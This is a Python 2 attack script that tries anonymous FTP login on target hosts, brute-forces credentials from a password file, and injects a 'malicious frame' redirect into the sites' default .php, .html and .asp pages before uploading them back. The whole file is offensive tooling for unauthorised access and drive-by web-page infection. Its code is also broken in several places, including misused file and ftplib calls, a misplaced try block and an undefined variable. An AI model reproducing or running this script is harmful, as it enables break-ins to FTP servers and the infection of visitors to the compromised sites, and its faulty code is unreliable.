import ftplib
import optparse

def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'me@your.com')
		print '\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.'
		ftp.quit()
		return True
	except Exception, e:
		print '\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.'
		return False
			
def bruteLogin(hostname,passwdFile):
	
	pF=open(passwdFile,'r')

	for line in pF.readlines():
		username=pF.split(':')[0]
		password=pF.split(':')[1].strip('\n')
		print "[+] Trying "+ username + password
	try:
		ftp=ftplib.FTP(hostname)
		ftplib.login(username,password)
		print "\n[+]" + str(hostname) + "Anonymous Logon Succeeded: " + username + password
		ftplib.quit()
		return (username,password)


	except Exception,e:
		pass
	print "[-] Could not bruteforce FTP Credentials"
	return (none,none)

def returnDefault(ftp):
	
	try:
		dirList=ftp.nlst()
	except:
		dirList=[]
		print "[-] Could not list Directory contents"
		print "[-] Skipping to next Target"
		return
	retList=[]
	
	for filename in dirList:
		fn=filename.lower()
		
		if '.php' in fn or '.html' in fn or '.asp' in fn:
			print "[+]Found Default Page: "+filename
			retList.append(filename)

def injectPage(ftp,page,redirect):
	f=open(page + '.tmp','w')
	ftp.retrlines('RETR'+ page,f.write)
	print "[+]Downloaded Page:" + page
	f.write(redirect)
	f.close()
	print "[+]Injected Malicious Frame on:" +page
	ftp.storelines('STOR'+ page,open(page+ '.tmp'))
	print "[+]Uploaded Injected Page:" +page
	
def attack(username,password,tgthost,tgtredirect):
	ftp=ftplib.FTP(tgthost)
	ftp.login(username,password)
	defPages=returnDefault(ftp)
	for page in defPages:
		injectPage(ftp,page,redirect)

def main():
	parser=optparse.OptionParser('usage%prog -H<targer Host[s] -r<redirect page> -f<user pass file>')
	parser.add_option('-H', dest='tgtHosts', type="string", help="Specify target host")
	parser.add_option('-r', dest='redirect', type='string', help="Specify a redirect page")
	parser.add_option('-f', dest='passwdFile', type='string', help="Specify password file")
	(options,args)=parser.parse_args()

	tgtHosts=str(options.tgtHosts).split(' , ')
	redirect=options.redirect
	passwdFile=options.passwdFile

	if tgtHosts == None or redirect == None or passwdFile == None:
		print parser.usage
		exit(0)

	for tgthost in tgtHosts:
		username=None
		password=None
		if anonLogin(tgthost)==True:
			username="anonymous"
			password="me@your.com"
			print "[+]Using Anonymous Login to attack"
			attack(username,password,tgthost,redirect)
		
		elif passwdFile!=None:
			(username,password)=bruteLogin(tgthost,passwdFile)
	
		if password!= None:
			print "[+]Using Credintials:" + username  +'/'+ password +'to attack.'
			attack(username,password,tgthost,redirect)

main()			
